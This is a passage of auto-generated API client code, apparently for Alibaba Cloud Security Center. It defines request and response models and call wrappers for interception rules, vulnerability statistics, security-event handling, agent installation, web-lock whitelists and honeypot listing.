    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getInterceptionRuleDetail(request: GetInterceptionRuleDetailRequest): GetInterceptionRuleDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getInterceptionRuleDetailWithOptions(request, runtime);
}

model GetInterceptionSummaryResponseBody = {
  interceptionSummary?: {
    closeClusterCount?: int32(name='CloseClusterCount'),
    closeRuleCount?: int32(name='CloseRuleCount'),
    clusterCount?: int32(name='ClusterCount'),
    openClusterCount?: int32(name='OpenClusterCount'),
    openRuleCount?: int32(name='OpenRuleCount'),
    riskCount180Day?: long(name='RiskCount180Day'),
    riskCount30Day?: long(name='RiskCount30Day'),
    riskCountToday?: long(name='RiskCountToday'),
    ruleCount?: int32(name='RuleCount'),
  }(name='InterceptionSummary'),
  requestId?: string(name='RequestId'),
}

model GetInterceptionSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetInterceptionSummaryResponseBody(name='body'),
}

async function getInterceptionSummaryWithOptions(runtime: Util.RuntimeOptions): GetInterceptionSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetInterceptionSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getInterceptionSummary(): GetInterceptionSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getInterceptionSummaryWithOptions(runtime);
}

model GetInterceptionTargetDetailRequest {
  targetId?: long(name='TargetId'),
}

model GetInterceptionTargetDetailResponseBody = {
  requestId?: string(name='RequestId'),
  ruleTarget?: {
    appName?: string(name='AppName'),
    clusterId?: string(name='ClusterId'),
    clusterName?: string(name='ClusterName'),
    imageList?: [ string ](name='ImageList'),
    namespace?: string(name='Namespace'),
    tagList?: [ string ](name='TagList'),
    targetId?: long(name='TargetId'),
    targetName?: string(name='TargetName'),
    targetType?: string(name='TargetType'),
  }(name='RuleTarget'),
}

model GetInterceptionTargetDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetInterceptionTargetDetailResponseBody(name='body'),
}

async function getInterceptionTargetDetailWithOptions(request: GetInterceptionTargetDetailRequest, runtime: Util.RuntimeOptions): GetInterceptionTargetDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.targetId)) {
    query['TargetId'] = request.targetId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetInterceptionTargetDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getInterceptionTargetDetail(request: GetInterceptionTargetDetailRequest): GetInterceptionTargetDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getInterceptionTargetDetailWithOptions(request, runtime);
}

model GetLastOnceTaskInfoRequest {
  source?: string(name='Source'),
  taskName?: string(name='TaskName'),
  taskType?: string(name='TaskType'),
}

model GetLastOnceTaskInfoResponseBody = {
  collectTime?: long(name='CollectTime'),
  finishCount?: int32(name='FinishCount'),
  requestId?: string(name='RequestId'),
  taskId?: long(name='TaskId'),
  taskInfo?: {
    progress?: int32(name='Progress'),
    result?: string(name='Result'),
    status?: string(name='Status'),
  }(name='TaskInfo'),
  totalCount?: int32(name='TotalCount'),
}

model GetLastOnceTaskInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetLastOnceTaskInfoResponseBody(name='body'),
}

async function getLastOnceTaskInfoWithOptions(request: GetLastOnceTaskInfoRequest, runtime: Util.RuntimeOptions): GetLastOnceTaskInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetLastOnceTaskInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getLastOnceTaskInfo(request: GetLastOnceTaskInfoRequest): GetLastOnceTaskInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getLastOnceTaskInfoWithOptions(request, runtime);
}

model GetModuleConfigRequest {
  currentPage?: string(name='CurrentPage'),
  pageSize?: string(name='PageSize'),
}

model GetModuleConfigResponseBody = {
  httpStatusCode?: int32(name='HttpStatusCode'),
  moduleConfigList?: [ 
    {
      configName?: string(name='ConfigName'),
      items?: [ 
        {
          groupId?: int32(name='GroupId'),
          instanceId?: string(name='InstanceId'),
          instanceName?: string(name='InstanceName'),
          ip?: string(name='Ip'),
          region?: string(name='Region'),
          uuid?: string(name='Uuid'),
        }
      ](name='Items'),
      moduleName?: string(name='ModuleName'),
    }
  ](name='ModuleConfigList'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model GetModuleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetModuleConfigResponseBody(name='body'),
}

async function getModuleConfigWithOptions(request: GetModuleConfigRequest, runtime: Util.RuntimeOptions): GetModuleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetModuleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getModuleConfig(request: GetModuleConfigRequest): GetModuleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getModuleConfigWithOptions(request, runtime);
}

model GetOnceTaskResultInfoRequest {
  taskId?: string(name='TaskId'),
  taskName?: string(name='TaskName'),
  taskType?: string(name='TaskType'),
}

model GetOnceTaskResultInfoResponseBody = {
  collectTime?: long(name='CollectTime'),
  finishCount?: int32(name='FinishCount'),
  requestId?: string(name='RequestId'),
  taskId?: long(name='TaskId'),
  taskInfo?: {
    status?: string(name='Status'),
  }(name='TaskInfo'),
  totalCount?: int32(name='TotalCount'),
}

model GetOnceTaskResultInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetOnceTaskResultInfoResponseBody(name='body'),
}

async function getOnceTaskResultInfoWithOptions(request: GetOnceTaskResultInfoRequest, runtime: Util.RuntimeOptions): GetOnceTaskResultInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetOnceTaskResultInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getOnceTaskResultInfo(request: GetOnceTaskResultInfoRequest): GetOnceTaskResultInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getOnceTaskResultInfoWithOptions(request, runtime);
}

model GetPropertyScheduleConfigRequest {
  type?: string(name='Type'),
  uuid?: string(name='Uuid'),
}

model GetPropertyScheduleConfigResponseBody = {
  propertyScheduleConfig?: {
    nextScheduleTime?: long(name='NextScheduleTime'),
    scheduleTime?: string(name='ScheduleTime'),
    type?: string(name='Type'),
  }(name='PropertyScheduleConfig'),
  requestId?: string(name='RequestId'),
}

model GetPropertyScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetPropertyScheduleConfigResponseBody(name='body'),
}

async function getPropertyScheduleConfigWithOptions(request: GetPropertyScheduleConfigRequest, runtime: Util.RuntimeOptions): GetPropertyScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetPropertyScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getPropertyScheduleConfig(request: GetPropertyScheduleConfigRequest): GetPropertyScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getPropertyScheduleConfigWithOptions(request, runtime);
}

model GetRulesCountResponseBody = {
  requestId?: string(name='RequestId'),
  totalSystemClientRuleCount?: long(name='TotalSystemClientRuleCount'),
  totalUserDefineRuleCount?: long(name='TotalUserDefineRuleCount'),
}

model GetRulesCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetRulesCountResponseBody(name='body'),
}

async function getRulesCountWithOptions(runtime: Util.RuntimeOptions): GetRulesCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetRulesCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getRulesCount(): GetRulesCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getRulesCountWithOptions(runtime);
}

model GetSuspiciousStatisticsRequest {
  groupIdList?: string(name='GroupIdList'),
  sourceIp?: string(name='SourceIp'),
}

model GetSuspiciousStatisticsResponseBody = {
  remindCount?: int32(name='RemindCount'),
  requestId?: string(name='RequestId'),
  seriousCount?: int32(name='SeriousCount'),
  suspiciousCount?: int32(name='SuspiciousCount'),
  totalCount?: int32(name='TotalCount'),
}

model GetSuspiciousStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetSuspiciousStatisticsResponseBody(name='body'),
}

async function getSuspiciousStatisticsWithOptions(request: GetSuspiciousStatisticsRequest, runtime: Util.RuntimeOptions): GetSuspiciousStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupIdList)) {
    query['GroupIdList'] = request.groupIdList;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetSuspiciousStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getSuspiciousStatistics(request: GetSuspiciousStatisticsRequest): GetSuspiciousStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getSuspiciousStatisticsWithOptions(request, runtime);
}

model GetVulStatisticsRequest {
  groupIdList?: string(name='GroupIdList'),
  sourceIp?: string(name='SourceIp'),
  typeList?: string(name='TypeList'),
}

model GetVulStatisticsResponseBody = {
  requestId?: string(name='RequestId'),
  vulAsapSum?: int32(name='VulAsapSum'),
  vulLaterSum?: int32(name='VulLaterSum'),
  vulNntfSum?: int32(name='VulNntfSum'),
}

model GetVulStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetVulStatisticsResponseBody(name='body'),
}

async function getVulStatisticsWithOptions(request: GetVulStatisticsRequest, runtime: Util.RuntimeOptions): GetVulStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupIdList)) {
    query['GroupIdList'] = request.groupIdList;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.typeList)) {
    query['TypeList'] = request.typeList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetVulStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getVulStatistics(request: GetVulStatisticsRequest): GetVulStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getVulStatisticsWithOptions(request, runtime);
}

model GetVulWhitelistRequest {
  vulWhitelistId?: long(name='VulWhitelistId'),
}

model GetVulWhitelistResponseBody = {
  requestId?: string(name='RequestId'),
  vulWhitelist?: {
    aliasName?: string(name='AliasName'),
    id?: long(name='Id'),
    name?: string(name='Name'),
    reason?: string(name='Reason'),
    target?: string(name='Target'),
    type?: string(name='Type'),
    whitelist?: string(name='Whitelist'),
  }(name='VulWhitelist'),
}

model GetVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetVulWhitelistResponseBody(name='body'),
}

async function getVulWhitelistWithOptions(request: GetVulWhitelistRequest, runtime: Util.RuntimeOptions): GetVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vulWhitelistId)) {
    query['VulWhitelistId'] = request.vulWhitelistId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getVulWhitelist(request: GetVulWhitelistRequest): GetVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return getVulWhitelistWithOptions(request, runtime);
}

model HandleSecurityEventsRequest {
  markBatch?: string(name='MarkBatch'),
  markMissParam?: string(name='MarkMissParam'),
  operationCode?: string(name='OperationCode'),
  operationParams?: string(name='OperationParams'),
  securityEventIds?: [ string ](name='SecurityEventIds'),
  sourceIp?: string(name='SourceIp'),
}

model HandleSecurityEventsResponseBody = {
  handleSecurityEventsResponse?: {
    taskId?: long(name='TaskId'),
  }(name='HandleSecurityEventsResponse'),
  requestId?: string(name='RequestId'),
}

model HandleSecurityEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: HandleSecurityEventsResponseBody(name='body'),
}

async function handleSecurityEventsWithOptions(request: HandleSecurityEventsRequest, runtime: Util.RuntimeOptions): HandleSecurityEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.markBatch)) {
    query['MarkBatch'] = request.markBatch;
  }
  if (!Util.isUnset(request.markMissParam)) {
    query['MarkMissParam'] = request.markMissParam;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationParams)) {
    query['OperationParams'] = request.operationParams;
  }
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'HandleSecurityEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function handleSecurityEvents(request: HandleSecurityEventsRequest): HandleSecurityEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return handleSecurityEventsWithOptions(request, runtime);
}

model HandleSimilarSecurityEventsRequest {
  markMissParam?: string(name='MarkMissParam'),
  operationCode?: string(name='OperationCode'),
  operationParams?: string(name='OperationParams'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
  taskId?: long(name='TaskId'),
}

model HandleSimilarSecurityEventsResponseBody = {
  requestId?: string(name='RequestId'),
}

model HandleSimilarSecurityEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: HandleSimilarSecurityEventsResponseBody(name='body'),
}

async function handleSimilarSecurityEventsWithOptions(request: HandleSimilarSecurityEventsRequest, runtime: Util.RuntimeOptions): HandleSimilarSecurityEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.markMissParam)) {
    query['MarkMissParam'] = request.markMissParam;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationParams)) {
    query['OperationParams'] = request.operationParams;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'HandleSimilarSecurityEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function handleSimilarSecurityEvents(request: HandleSimilarSecurityEventsRequest): HandleSimilarSecurityEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return handleSimilarSecurityEventsWithOptions(request, runtime);
}

model IgnoreCheckItemsRequest {
  checkAndRiskTypeList?: [ 
    {
      checkId?: long(name='CheckId'),
      riskType?: string(name='RiskType'),
    }
  ](name='CheckAndRiskTypeList'),
  lang?: string(name='Lang'),
  reason?: string(name='Reason'),
  type?: int32(name='Type'),
  uuidList?: [ string ](name='UuidList'),
}

model IgnoreCheckItemsResponseBody = {
  requestId?: string(name='RequestId'),
}

model IgnoreCheckItemsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: IgnoreCheckItemsResponseBody(name='body'),
}

async function ignoreCheckItemsWithOptions(request: IgnoreCheckItemsRequest, runtime: Util.RuntimeOptions): IgnoreCheckItemsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkAndRiskTypeList)) {
    query['CheckAndRiskTypeList'] = request.checkAndRiskTypeList;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'IgnoreCheckItems',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function ignoreCheckItems(request: IgnoreCheckItemsRequest): IgnoreCheckItemsResponse {
  var runtime = new Util.RuntimeOptions{};
  return ignoreCheckItemsWithOptions(request, runtime);
}

model IgnoreHcCheckWarningsRequest {
  checkIds?: string(name='CheckIds'),
  checkWarningIds?: string(name='CheckWarningIds'),
  reason?: string(name='Reason'),
  riskId?: string(name='RiskId'),
  sourceIp?: string(name='SourceIp'),
  type?: long(name='Type'),
}

model IgnoreHcCheckWarningsResponseBody = {
  requestId?: string(name='RequestId'),
}

model IgnoreHcCheckWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: IgnoreHcCheckWarningsResponseBody(name='body'),
}

async function ignoreHcCheckWarningsWithOptions(request: IgnoreHcCheckWarningsRequest, runtime: Util.RuntimeOptions): IgnoreHcCheckWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.checkWarningIds)) {
    query['CheckWarningIds'] = request.checkWarningIds;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'IgnoreHcCheckWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function ignoreHcCheckWarnings(request: IgnoreHcCheckWarningsRequest): IgnoreHcCheckWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return ignoreHcCheckWarningsWithOptions(request, runtime);
}

model InstallBackupClientRequest {
  policyVersion?: string(name='PolicyVersion'),
  uuid?: string(name='Uuid'),
  uuidList?: [ string ](name='UuidList'),
}

model InstallBackupClientResponseBody = {
  requestId?: string(name='RequestId'),
}

model InstallBackupClientResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallBackupClientResponseBody(name='body'),
}

async function installBackupClientWithOptions(request: InstallBackupClientRequest, runtime: Util.RuntimeOptions): InstallBackupClientResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallBackupClient',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function installBackupClient(request: InstallBackupClientRequest): InstallBackupClientResponse {
  var runtime = new Util.RuntimeOptions{};
  return installBackupClientWithOptions(request, runtime);
}

model InstallCloudMonitorRequest {
  agentAccessKey?: string(name='AgentAccessKey'),
  agentSecretKey?: string(name='AgentSecretKey'),
  argusVersion?: string(name='ArgusVersion'),
  instanceIdList?: [ string ](name='InstanceIdList'),
  uuidList?: [ string ](name='UuidList'),
}

model InstallCloudMonitorResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model InstallCloudMonitorResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallCloudMonitorResponseBody(name='body'),
}

async function installCloudMonitorWithOptions(request: InstallCloudMonitorRequest, runtime: Util.RuntimeOptions): InstallCloudMonitorResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.agentAccessKey)) {
    query['AgentAccessKey'] = request.agentAccessKey;
  }
  if (!Util.isUnset(request.agentSecretKey)) {
    query['AgentSecretKey'] = request.agentSecretKey;
  }
  if (!Util.isUnset(request.argusVersion)) {
    query['ArgusVersion'] = request.argusVersion;
  }
  if (!Util.isUnset(request.instanceIdList)) {
    query['InstanceIdList'] = request.instanceIdList;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallCloudMonitor',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function installCloudMonitor(request: InstallCloudMonitorRequest): InstallCloudMonitorResponse {
  var runtime = new Util.RuntimeOptions{};
  return installCloudMonitorWithOptions(request, runtime);
}

model InstallPmAgentRequest {
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
  type?: string(name='Type'),
  uuids?: string(name='Uuids'),
}

model InstallPmAgentResponseBody = {
  requestId?: string(name='RequestId'),
}

model InstallPmAgentResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallPmAgentResponseBody(name='body'),
}

async function installPmAgentWithOptions(request: InstallPmAgentRequest, runtime: Util.RuntimeOptions): InstallPmAgentResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallPmAgent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function installPmAgent(request: InstallPmAgentRequest): InstallPmAgentResponse {
  var runtime = new Util.RuntimeOptions{};
  return installPmAgentWithOptions(request, runtime);
}

model InstallUniBackupAgentRequest {
  policyId?: long(name='PolicyId'),
}

model InstallUniBackupAgentResponseBody = {
  requestId?: string(name='RequestId'),
}

model InstallUniBackupAgentResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallUniBackupAgentResponseBody(name='body'),
}

async function installUniBackupAgentWithOptions(request: InstallUniBackupAgentRequest, runtime: Util.RuntimeOptions): InstallUniBackupAgentResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallUniBackupAgent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function installUniBackupAgent(request: InstallUniBackupAgentRequest): InstallUniBackupAgentResponse {
  var runtime = new Util.RuntimeOptions{};
  return installUniBackupAgentWithOptions(request, runtime);
}

model JoinWebLockProcessWhiteListRequest {
  processPaths?: [ string ](name='ProcessPaths'),
  uuids?: string(name='Uuids'),
}

model JoinWebLockProcessWhiteListResponseBody = {
  requestId?: string(name='RequestId'),
}

model JoinWebLockProcessWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: JoinWebLockProcessWhiteListResponseBody(name='body'),
}

async function joinWebLockProcessWhiteListWithOptions(request: JoinWebLockProcessWhiteListRequest, runtime: Util.RuntimeOptions): JoinWebLockProcessWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.processPaths)) {
    query['ProcessPaths'] = request.processPaths;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'JoinWebLockProcessWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function joinWebLockProcessWhiteList(request: JoinWebLockProcessWhiteListRequest): JoinWebLockProcessWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return joinWebLockProcessWhiteListWithOptions(request, runtime);
}

model ListAvailableHoneypotRequest {
  nodeId?: string(name='NodeId'),
}

model ListAvailableHoneypotResponseBody = {
  code?: string(name='Code'),
  count?: int32(name='Count'),
  data?: [ 
    {
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName'),
      honeypotImageId?: string(name='HoneypotImageId'),
      honeypotImageName?: string(name='HoneypotImageName'),
      honeypotImageType?: string(name='HoneypotImageType'),
      honeypotImageVersion?: string(name='HoneypotImageVersion'),
      multiports?: string(name='Multiports'),
      proto?: string(name='Proto'),
      servicePort?: string(name='ServicePort'),
      template?: string(name='Template'),
    }
